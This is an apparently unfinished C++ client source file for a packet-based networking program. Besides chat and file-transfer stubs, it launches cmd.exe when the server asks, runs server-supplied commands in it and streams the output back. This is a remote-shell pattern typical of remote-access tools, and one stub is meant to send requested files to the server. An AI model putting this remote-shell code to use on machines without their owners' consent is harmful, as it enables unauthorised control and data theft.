#include "MyClient.hpp"
#include <iostream>
bool MyClient::ProcessPacket(std::shared_ptr<Packet> packet) {
	switch (packet->GetPacketType()) {
		case PacketType::PT_ChatMessage: {
			std::string chatmessage;
			*packet >> chatmessage;
			std::cout << "\n[+] Chat Message: " << chatmessage ;
			break;
		}

		// Just launch cmd.exe process.
		case PacketType::PT_Shell: {
			pShell = std::shared_ptr<CMD>(new CMD);
			pShell->Start();
			std::jthread jtSending(&MyClient::Sending, std::ref(*pMyClient));
			if (jtSending.joinable()) jtSending.detach();

			//maybe another thread that appends in a loop to queueIn from instructionQueueOut?
			break;
		}
		
		case PacketType::PT_Command: {
			pShell->WritePipe(ExtractDataFromPacket(packet));
			/*
			[!] [!] [!]
			cmd output retrieved only after certin time,
			timing and synchronization issues
			but while debugging cmd result is sent as needed
			TODO: add events
			*/
			
			break;
		}

		case PacketType::PT_IntegerArray: {
			uint32_t arraySize = 0;
			*packet >> arraySize;
			std::cout << "Array size: " << arraySize << std::endl;

			for (uint32_t i = 0; i < arraySize; i++) {
				uint32_t element = 0;
				*packet >> element;
				std::cout << "Element[" << i << "] - " << element << std::endl;
			}
			break;
		}

		case PacketType::PT_FileTransferRequest: {
			std::string Filename;
			*packet >> Filename;
			// run function that searches file and sends it to server
			break;
		}

		case PacketType::PT_FileTransferData: {  // transfer from server to client
			FileTransferHandler fth;
			// char * file_buffer ;
			break;
		}

		default:{
			std::cout << "Unrecognized packet type: " << packet->GetPacketType() << std::endl;
			return false;
			break;
		}
	}
	return true;
}

std::shared_ptr<Packet> MyClient::CreatePacket(std::string data, PacketType packetType) {
	std::shared_ptr<Packet> packet = std::make_shared<Packet>(packetType);
	*packet << data<< '\n';
	return packet;
}

void MyClient::Sending() {
	while (pClientCommunication->clientCommunnicationOpen) {
		while (!pShell->commandQueueOut.empty()) {
			std::shared_ptr<Packet> p = CreatePacket(pShell->commandQueueOut.front(), PacketType::PT_ChatMessage);
			SendPacket(p);
			pShell->commandQueueOut.pop_front();
		}
	}
}

void MyClient::SendPacket(std::shared_ptr<Packet> packet) {
	pClientCommunication->queueIn.push_back(packet);
}

std::string MyClient::ExtractDataFromPacket(std::shared_ptr<Packet> pPacket) {
	std::string c;
	*pPacket >> c;
	return c;
}

void MyClient::OnConnect() {
	pClientCommunication = std::shared_ptr<ClientCommunication>(new ClientCommunication(*this));
	
	std::cout << "\n[+] Successfully connected to the server!";
	std::shared_ptr<Packet> helloPacket = std::make_shared<Packet>(PacketType::PT_ChatMessage);
	*helloPacket << std::string("\n[+] Hello from client!\n");
	connection.pm_outgoing.Append(helloPacket);
}
